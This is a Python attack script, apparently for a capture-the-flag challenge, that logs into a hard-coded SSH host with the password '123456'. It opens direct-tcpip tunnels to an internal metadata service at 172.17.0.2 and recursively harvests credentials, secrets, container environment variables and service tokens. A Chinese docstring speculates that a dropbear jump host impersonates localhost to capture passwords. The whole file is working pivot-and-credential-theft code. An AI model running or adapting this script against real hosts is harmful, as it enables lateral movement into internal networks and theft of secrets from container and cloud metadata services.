import paramiko
import socket
import time
import sys
import threading

"""
核心发现：
- dropbear伪装了所有本地地址 (localhost, 127.0.0.1, etc.)
- 172.17.0.1 返回真正的OpenSSH Ubuntu

这意味着如果有人执行：
ssh -J ctf@challenge:55300 ctf@localhost

他们会：
1. 连接到challenge:55300的dropbear (跳板机)
2. 跳板机打开到localhost:22的连接
3. 但dropbear返回的是它自己！
4. 用户会看到相同的主机密钥，以为成功连接
5. 输入密码后，dropbear可能会记录密码

问题是：密码记录在哪里？

让我检查元数据服务是否有这些信息
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def http_get(transport, host, port, path):
    """发送HTTP GET请求"""
    try:
        channel = transport.open_channel("direct-tcpip", (host, port), ('127.0.0.1', 0), timeout=5)
        channel.settimeout(5)
        
        request = f"GET {path} HTTP/1.0\r\nHost: {host}\r\n\r\n"
        channel.send(request.encode())
        
        time.sleep(0.5)
        response = b""
        while True:
            try:
                chunk = channel.recv(4096)
                if not chunk:
                    break
                response += chunk
            except:
                break
        
        channel.close()
        
        # 解析HTTP响应
        response_text = response.decode()
        if "\r\n\r\n" in response_text:
            body = response_text.split("\r\n\r\n", 1)[1]
            return body
        return response_text
    except Exception as e:
        return f"Error: {e}"

def check_metadata_for_credentials():
    """检查元数据服务是否有凭据"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 检查元数据服务是否有凭据信息")
    
    # 可能包含凭据的路径
    paths = [
        "/latest/self/container/environment/",
        "/latest/self/service/metadata/",
        "/latest/credentials/",
        "/latest/secrets/",
        "/latest/self/container/metadata/",
        # 尝试查看所有容器的环境变量
        "/latest/containers/",
    ]
    
    for path in paths:
        result = http_get(transport, "172.17.0.2", 80, path)
        if result and "Error" not in result and "Not found" not in result:
            print(f"\n{path}:")
            print(result[:500])
    
    ssh.close()

def explore_container_environments():
    """探索所有容器的环境变量"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("\n[*] 探索容器环境变量")
    
    # 获取容器列表
    containers_list = http_get(transport, "172.17.0.2", 80, "/latest/containers/")
    
    if "Error" in containers_list:
        print("无法获取容器列表")
        return
    
    lines = containers_list.strip().split("\n")
    print(f"共 {len(lines)} 个容器")
    
    # 检查每个容器的环境变量
    for line in lines:
        parts = line.split("=")
        if len(parts) == 2:
            index = parts[0]
            name = parts[1]
            
            # 获取环境变量
            env_result = http_get(transport, "172.17.0.2", 80, f"/latest/containers/{index}/environment/")
            if env_result and "Error" not in env_result and "Not found" not in env_result:
                env_clean = env_result.strip()
                if env_clean:
                    print(f"\n容器 {name}:")
                    
                    # 获取每个环境变量的值
                    env_vars = env_clean.split("\n")
                    for var in env_vars:
                        if var:
                            var_value = http_get(transport, "172.17.0.2", 80, f"/latest/containers/{index}/environment/{var}")
                            if var_value and "Error" not in var_value and "Not found" not in var_value:
                                print(f"  {var}: {var_value.strip()}")
    
    ssh.close()

def check_specific_env_vars():
    """检查特定的环境变量"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("\n[*] 检查当前容器的环境变量")
    
    # 检查自己容器的环境变量
    env_list = http_get(transport, "172.17.0.2", 80, "/latest/self/container/environment/")
    
    if env_list and "Error" not in env_list:
        print(f"环境变量列表:\n{env_list}")
        
        # 获取每个变量的值
        if env_list.strip():
            for var in env_list.strip().split("\n"):
                if var:
                    value = http_get(transport, "172.17.0.2", 80, f"/latest/self/container/environment/{var}")
                    if value and "Error" not in value and "Not found" not in value:
                        print(f"  {var} = {value.strip()}")
    else:
        print("环境变量列表为空或出错")
    
    ssh.close()

def find_password_in_metadata():
    """在元数据中搜索密码相关信息"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("\n[*] 搜索密码相关信息")
    
    # 搜索所有服务的元数据
    services_list = http_get(transport, "172.17.0.2", 80, "/latest/services/")
    
    if "Error" not in services_list:
        lines = services_list.strip().split("\n")
        
        for line in lines:
            if "verygoodssh" in line.lower() or "very_good_ssh" in line.lower():
                parts = line.split("=")
                if len(parts) == 2:
                    index = parts[0]
                    name = parts[1]
                    
                    print(f"\n服务 {name} (index={index}):")
                    
                    # 获取服务的所有信息
                    for attr in ["metadata/", "labels/", "environment/", "token", "uuid"]:
                        result = http_get(transport, "172.17.0.2", 80, f"/latest/services/{index}/{attr}")
                        if result and "Error" not in result and "Not found" not in result:
                            result_clean = result.strip()
                            if result_clean:
                                print(f"  {attr}: {result_clean[:200]}")
    
    ssh.close()

def deep_explore_self_metadata():
    """深入探索self的元数据"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("\n[*] 深入探索self元数据")
    
    def recursive_explore(base_path, depth=0):
        if depth > 4:
            return
        
        result = http_get(transport, "172.17.0.2", 80, base_path)
        if not result or "Error" in result or "Not found" in result:
            return
        
        items = result.strip().split("\n")
        for item in items:
            if item.endswith("/"):
                # 目录
                subpath = base_path.rstrip("/") + "/" + item
                print(f"{'  '*depth}{item}")
                recursive_explore(subpath, depth+1)
            else:
                # 文件
                value = http_get(transport, "172.17.0.2", 80, base_path.rstrip("/") + "/" + item)
                if value and "Error" not in value and "Not found" not in value:
                    value_clean = value.strip()
                    # 只显示有意义的值
                    if value_clean and len(value_clean) < 200:
                        print(f"{'  '*depth}{item}: {value_clean}")
    
    recursive_explore("/latest/self/")
    
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] 深入探索元数据寻找凭据")
    print("="*60)
    
    check_metadata_for_credentials()
    check_specific_env_vars()
    find_password_in_metadata()
    
    print("\n" + "="*60)
    print("[*] 深入探索self")
    print("="*60)
    deep_explore_self_metadata()
